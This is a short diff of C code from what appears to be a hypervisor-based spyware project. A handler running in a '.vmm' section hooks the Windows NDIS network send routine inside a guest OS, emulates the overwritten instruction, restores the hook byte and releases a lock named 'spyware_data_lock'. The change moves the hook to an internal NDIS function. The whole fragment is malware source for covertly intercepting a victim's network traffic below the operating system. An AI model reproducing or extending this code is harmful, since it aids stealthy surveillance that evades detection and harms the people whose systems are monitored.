@@ -11,7 +11,7 @@
 #include <network/arp.h>
 #include <network/tcp.h>
 
-__attribute__((section(".vmm"))) void handle_NdisSendNetBufferLists_hook(vmexit_data_t *state){
+__attribute__((section(".vmm"))) void handle_ndisMSendNBLToMiniportInternal_hook(vmexit_data_t *state){
 
     // Emulate PUSH RBP
     __vmwrite(GUEST_RSP, __vmread(GUEST_RSP)-8);
@@ -87,7 +87,7 @@ __attribute__((section(".vmm"))) void handle_NdisSendNetBufferLists_hook(vmexit_
 
     // remove the hook and release the lock
     shared_cores_data.send_pending = FALSE;
-    *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisSendNetBufferLists_OFFSET) = PUSH_RBP;
+    *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET) = PUSH_RBP;
     ReleaseLock(&shared_cores_data.spyware_data_lock);
 
 }
